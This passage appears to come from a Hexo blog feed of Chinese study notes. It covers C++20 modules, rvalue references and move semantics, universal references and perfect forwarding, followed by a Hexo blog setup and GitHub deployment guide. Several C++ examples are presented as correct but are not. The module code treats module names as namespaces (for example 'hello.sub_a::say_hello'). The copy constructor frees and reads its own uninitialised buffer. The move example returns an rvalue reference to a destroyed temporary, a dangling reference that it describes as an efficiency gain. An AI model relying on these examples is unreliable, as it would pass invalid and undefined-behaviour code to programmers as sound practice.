导入hello父模块，相当于同时导入了两个子模块</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">say_hello_sub_a</span>(); <span class="comment">// 调用say_hello_sub_a函数</span></span><br><span class="line">  <span class="built_in">say_hello_sub_b</span>(); <span class="comment">// 调用say_hello_sub_b函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>命名空间冲突是指不同的模块或源文件中定义了相同的名称，导致编译器无法区分它们的含义。C++20 模块提供了一些方法来避免或解决命名空间冲突：</p><ul><li><p>使用不同的模块名字来区分不同的模块，例如 hello.sub_a 和 hello.sub_b 就是两个不同的模块，即使它们都定义了 say_hello 函数，也不会发生冲突。</p></li><li><p>使用限定名字来指定模块中的名称，例如 hello.sub_a::say_hello 和 hello.sub_b::say_hello 就可以明确地区分两个模块中的函数。</p></li><li><p>使用 using 声明或 using 指令来引入需要的名称，但要注意避免引入重复或冲突的名称。例如:</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="keyword">import</span> hello; <span class="comment">// 导入hello父模块</span></span><br><span class="line"><span class="keyword">using</span> hello.sub_a::say_hello; <span class="comment">// 引入hello.sub_a中的say_hello函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">say_hello</span>(); <span class="comment">// 调用hello.sub_a中的say_hello函数</span></span><br><span class="line">  hello.sub_b::<span class="built_in">say_hello</span>(); <span class="comment">// 调用hello.sub_b中的say_hello函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>使用 export 关键字来控制哪些名称被导出到其他模块或源文件，以减少暴露给外部的名称。例如：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// math.cppm</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">module</span> math; <span class="comment">// 声明一个名为math的模块</span></span><br><span class="line"><span class="keyword">namespace</span> detail &#123; <span class="comment">// 定义一个未导出的命名空间detail</span></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123; <span class="keyword">return</span> x + y; &#125; <span class="comment">// 定义一个未导出的函数add</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">export</span> <span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123; <span class="keyword">return</span> detail::<span class="built_in">add</span>(x, y); &#125; <span class="comment">// 定义并导出一个函数sum，它调用了detail命名空间中的add函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="keyword">import</span> math; <span class="comment">// 导入math模块</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> s = math::<span class="built_in">sum</span>(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">// 调用math模块中导出的sum函数</span></span><br><span class="line">  <span class="type">int</span> a = math::detail::<span class="built_in">add</span>(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">// 错误：math模块没有导出detail命名空间或add函数</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>引用</title>
      <link href="/2023/03/22/%E5%BC%95%E7%94%A8/"/>
      <url>/2023/03/22/%E5%BC%95%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="指针与引用"><a href="#指针与引用" class="headerlink" title="指针与引用"></a>指针与引用</h2><p>引用必须要初始化。</p><p>指针会根据编译器不同而变化，32位4字节，64位8字节</p><p>引用根据被引用的数据类型变化</p><p>int*&amp; 指针的引用 以指针来判断。</p><h2 id="右值引用-c-11"><a href="#右值引用-c-11" class="headerlink" title="右值引用 c++11"></a>右值引用 c++11</h2><ol><li>左值：可以长时间保存，可以存在于&#x3D;左边的值，可以取地址；</li><li>右值：临时值，不能存在于&#x3D;左边的值，不可以取地址。</li></ol><p>左值引用，实际上是取地址赋给新的变量。必须初始化。</p><p>常引用，用于引用部分右值，不可进行更改。实际上是使用一个临时变量与一块临时内存进行存储，必须初始化。可以引用左与右。</p><p><img src="/.io//image-20230318004324533.png" alt="image-20230318004324533"></p><p>右值引用原理相近，临时内存的地址无法获取，但是可以对临时内存里面的内容进行修改。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>&amp;&amp; v1 = <span class="number">10</span>;</span><br><span class="line">v1++;</span><br></pre></td></tr></table></figure><p>  右值引用是C++11新特性，之所以引入右值引用，是为了提高效率。如下面所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">A</span>(<span class="type">size_t</span> N):<span class="built_in">m_p</span>(<span class="keyword">new</span> <span class="type">char</span>[N])</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">A</span>(<span class="type">const</span> A &amp; a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span> != &amp;a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span>[]m_p;</span><br><span class="line">m_p = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(m_p) + <span class="number">1</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(m_p, a.m_p, <span class="built_in">strlen</span>(m_p) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">A</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> []m_p;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span> *m_p = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function">A <span class="title">createA</span><span class="params">(<span class="type">size_t</span> N)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">A</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(A a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">func</span>(<span class="built_in">createA</span>(<span class="number">100</span>));</span><br><span class="line"> </span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 这里会导致大量得调用A得构造函数，不考虑编译优化，原本执行如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">createA(100)，执行A(100)调用A(size_t)构造函数一次；</span><br><span class="line">退出createA，临时构造得A(100)，释放调用析构函数一次；</span><br><span class="line">赋给返回值会调用一次拷贝构造函数一次；</span><br><span class="line">返回值传入func中形参会调用拷贝构造函数一次；</span><br><span class="line">func运行完成后形参释放，调用A析构函数一次；</span><br><span class="line">返回值使用完成释放，调用A析构函数一次；</span><br></pre></td></tr></table></figure><p>从上面可以看出有大量得构造、析构调用 ，但是我们做的工作无非就是临时构造一个A(100)给func使用而已。那么可否将临时A(100)始终一份给到func使用呢？答案就是右值引用。如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">A</span>(<span class="type">size_t</span> N):<span class="built_in">m_p</span>(<span class="keyword">new</span> <span class="type">char</span>[N])</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">A</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> []m_p;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span> *m_p = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function">A&amp;&amp; <span class="title">createA</span><span class="params">(<span class="type">size_t</span> N)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (A&amp;&amp;)<span class="built_in">A</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(A&amp;&amp; a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">func</span>(<span class="built_in">createA</span>(<span class="number">100</span>));</span><br><span class="line"> </span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  我们将临时A(100)强制转换为了右值引用，同时func形参也是右值引用，也就是将临时对象延长到了func中，中间避免了其他构造和析构调用，提高了效率。</p><p>​    注意到我们将A得拷贝构造函数去掉了，因为已经用不到。如果原版写法，去掉拷贝构造函数会崩溃，因为会自动调用默认拷贝构造函数，是浅拷贝，中间临时对象会提前删除公共内存，后面对象再次释放是就会重复删除内存导致崩溃。</p><p>这就是<strong>移动</strong>。它可以让你将一个对象的资源（如内存、文件句柄等）从一个临时的右值转移给另一个对象，而不需要进行深拷贝这样可以提高性能，避免不必要的内存分配和释放</p><p><img src="/.io//image-20230319210844838.png" alt="image-20230319210844838"></p><p>std::move可以转换左值引用为右值引用。实现原理实际上就是强制转换</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> &amp;&amp;t = std::<span class="built_in">move</span>(a);</span><br><span class="line"><span class="type">int</span> &amp;&amp;t2 = std::<span class="built_in">move</span>(<span class="number">3</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> &amp;&amp;t = (<span class="type">int</span> &amp;&amp;)a;</span><br><span class="line">t = <span class="number">9</span>;</span><br><span class="line">cout &lt;&lt; a &lt;&lt; endl;  <span class="comment">// a = 9</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>std::unique_ptr<T>不能相等，因为他们是不可以拷贝的，因此不可以左值赋给左值。使用移动，把左值转换成右值，就可以让二者相等。</T></p><p><img src="/.io//image-20230319211406922.png" alt="image-20230319211406922"></p><h2 id="通用引用"><a href="#通用引用" class="headerlink" title="通用引用"></a>通用引用</h2><p>通用引用就是根据接受值类型可以自行推导是左值引用还是右值引用。</p><p>如果声明变量或参数具有T&amp;&amp;某种推导类型的类型 T，则该变量或参数为通用引用，否则就是右值引用（无法传入左值）。</p><p>也就是传入的参数在编译时需要推导，如果不需要推导，则不是通用引用。如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T &amp;&amp;)</span> </span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">B&lt;<span class="type">int</span>&gt; b;</span><br><span class="line">b.<span class="built_in">print</span>(<span class="number">3</span>);   <span class="comment">// 为右值引用</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为在编译print之前print中的参数已经由B<int> b确定了，所以在print编译时无需推导，故B中的T&amp;&amp;为右值引用。如果改为如下：</int></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Arg&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(Arg &amp;&amp;)</span> </span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">B&lt;<span class="type">int</span>&gt; b;</span><br><span class="line">b.<span class="built_in">print</span>(<span class="number">3</span>);   <span class="comment">// 为右值引用</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 因为print时函数模板形参和类模板形参类型时独立的，故在编译print时是需要推导的，故Arg&amp;&amp;为通用引用。</p><h2 id="引用折叠"><a href="#引用折叠" class="headerlink" title="引用折叠"></a>引用折叠</h2><p>引用虽然形式上是右值引用，但是却可以接受左值，这是怎么实现的呢？这就是引用折叠。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T&amp;&amp; t)</span>   </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">9</span>;</span><br><span class="line"><span class="built_in">print</span>(a);</span><br><span class="line"><span class="built_in">print</span>(<span class="number">9</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>print(a)时，因为a为左值,会被推导成print(int&amp; &amp;&amp;t)形式，int&amp; &amp;&amp;t 会被折叠为int &amp;，所以最终形式为print(int &amp;)。（左值被推导为左值引用）</p><p> print(9)时，为9为右值，所以被推导为print(int&amp;&amp; &amp;&amp;)形式，而int&amp;&amp; &amp;&amp;会被折叠为int&amp;&amp;，所以最终形式为print(int&amp;&amp;)。（右值被推导为右值引用）</p><p>引用类型只有两种，所以折叠形式就是4中，为：T&amp; &amp;,T&amp; &amp;&amp;,T&amp;&amp; &amp;,T&amp;&amp; &amp;&amp;。引用折叠规则概况为两种：</p><p>T&amp;&amp; &amp;&amp;折叠为T&amp;&amp;;</p><p>其他折叠为T&amp;.</p><h2 id="完美转发"><a href="#完美转发" class="headerlink" title="完美转发"></a>完美转发</h2><p>通用引用既可以接受左值也可以接受右值，但是通用引用本身是左值。如果在函数模板中继续传递该值给其他函数，势必会改变该值的属性，即都为左值引用。</p><p>使用std::forward<T>(a)可以进行完美转发，使值属性和之前保持一致。某个功能对左值和右值处理情况不一致，如果将左值和右值引用当作同一种情况使用，可能会会有性能损失。例如左值进行深拷贝，右值进行移动。</T></p><p>原理是使用了引用折叠。具有推导类型的T&amp;&amp;转换会进行引用折叠。而int&amp;&amp;类型是确定的，不能进行折叠。</p><p>有两套，传入的为左或右，用右值进行强制类型转换，左右转化为左，右右转化为右</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo快速入门</title>
      <link href="/2023/03/20/hexo%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/"/>
      <url>/2023/03/20/hexo%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><span id="more"></span><p>新开一个文件夹，右键，在这里打开git bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure><h2 id="配置github-SSH"><a href="#配置github-SSH" class="headerlink" title="配置github SSH"></a>配置github SSH</h2><p>ssh可以免密的将本地的源码和资源上传到github，无需要每次都输账号和密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮件地址&quot;</span></span><br></pre></td></tr></table></figure><p>在用户文件夹下生成了一个.ssh文件夹，进入，复制.pub文件中全部内容</p><p>打开github主页，点击个人设置，点击左侧的SSH and GPG keys，点击New SSH key</p><p>将id_rsa.pub复制的内容粘贴到key中，title随便起一个就行。</p><p>配置好用户名和邮箱</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;xxx&quot;</span> <span class="comment">#你的github用户名</span></span><br><span class="line">git config --global user.email <span class="string">&quot;xxx@163.com&quot;</span> <span class="comment">#填写你的github注册邮箱</span></span><br></pre></td></tr></table></figure><h1 id="写个人博客"><a href="#写个人博客" class="headerlink" title="写个人博客"></a>写个人博客</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><h2 id="新建一个博客"><a href="#新建一个博客" class="headerlink" title="新建一个博客"></a>新建一个博客</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo n &lt;title&gt;</span><br></pre></td></tr></table></figure><p>存放地址：<code>source/_posts</code></p><h2 id="解决图片问题"><a href="#解决图片问题" class="headerlink" title="解决图片问题"></a>解决图片问题</h2><p>_config.yml文件做如下修改：<code>yaml post_asset_folder: true</code></p><p>创建同名文件夹，可以放入图片</p><p>使用的是Typora编辑器，可以在编辑器的文件&#x2F;偏好设置&#x2F;图像中进行如下设置：</p><p>复制到指定路径<code>./$(filename)/</code></p><p>安装图片显示插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-image</span><br></pre></td></tr></table></figure><h2 id="生成本地静态网站并预览"><a href="#生成本地静态网站并预览" class="headerlink" title="生成本地静态网站并预览"></a>生成本地静态网站并预览</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><h2 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h2><p>在文章中加入<code>&lt;!--more--&gt;</code>或在开头加入description: xxx</p><h1 id="部署到github"><a href="#部署到github" class="headerlink" title="部署到github"></a>部署到github</h1><p>新建一个库，名字叫 username.github.io</p><h2 id="将本地库与远端github仓库绑定"><a href="#将本地库与远端github仓库绑定" class="headerlink" title="将本地库与远端github仓库绑定"></a>将本地库与远端github仓库绑定</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;commit&quot;</span></span><br><span class="line">git remote add origin 仓库的http地址</span><br><span class="line">git pull --rebase origin main</span><br><span class="line">git push [-u] origin main</span><br></pre></td></tr></table></figure><h2 id="编辑-config-yml"><a href="#编辑-config-yml" class="headerlink" title="编辑_config.yml"></a>编辑_config.yml</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy<span class="punctuation">:</span></span><br><span class="line">  type<span class="punctuation">:</span> git</span><br><span class="line">  repository<span class="punctuation">:</span> 仓库的ssh地址</span><br><span class="line">  branch<span class="punctuation">:</span> main</span><br></pre></td></tr></table></figure><h2 id="在bash部署"><a href="#在bash部署" class="headerlink" title="在bash部署"></a>在bash部署</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><h1 id="更改主题"><a href="#更改主题" class="headerlink" title="更改主题"></a>更改主题</h1><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive</span><br></pre></td></tr></table></figure><h2 id="下载对应的主题"><a href="#下载对应的主题" class="headerlink" title="下载对应的主题"></a>下载对应的主题</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><h2 id="更改配置文件"><a href="#更改配置文件" class="headerlink" title="更改配置文件"></a>更改配置文件</h2><p>编辑_config.yml</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme<span class="punctuation">:</span> butterfly</span><br></pre></td></tr></table></figure><h2 id="主题文档"><a href="#主题文档" class="headerlink" title="主题文档"></a>主题文档</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://butterfly.js.org/posts/21cfbf15/</span><br></pre></td></tr></table></figure><h1 id="开启live2d"><a href="#开启live2d" class="headerlink" title="开启live2d"></a>开启live2d</h1><h2 id="安装依赖-1"><a href="#安装依赖-1" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><h2 id="下载model文件"><a href="#下载model文件" class="headerlink" title="下载model文件"></a>下载model文件</h2><h3 id="模型浏览"><a href="#模型浏览" class="headerlink" title="模型浏览"></a>模型浏览</h3><p>live2d-widget-model-chitose<br>live2d-widget-model-epsilon2_1<br>live2d-widget-model-gf<br>live2d-widget-model-haru_01<br>live2d-widget-model-haru_02<br>live2d-widget-model-haruto<br>live2d-widget-model-hibiki<br>live2d-widget-model-hijiki<br>live2d-widget-model-izumi<br>live2d-widget-model-koharu<br>live2d-widget-model-miku<br>live2d-widget-model-nico<br>live2d-widget-model-nietzsche<br>live2d-widget-model-ni-j<br>live2d-widget-model-nipsilon<br>live2d-widget-model-nito<br>live2d-widget-model-shizuku<br>live2d-widget-model-tororo<br>live2d-widget-model-tsumiki<br>live2d-widget-model-unitychan<br>live2d-widget-model-wanko<br>live2d-widget-model-z16</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/wang_123_zy/article/details/87181892</span><br></pre></td></tr></table></figure><h3 id="模型下载"><a href="#模型下载" class="headerlink" title="模型下载"></a>模型下载</h3><figure class="highlight 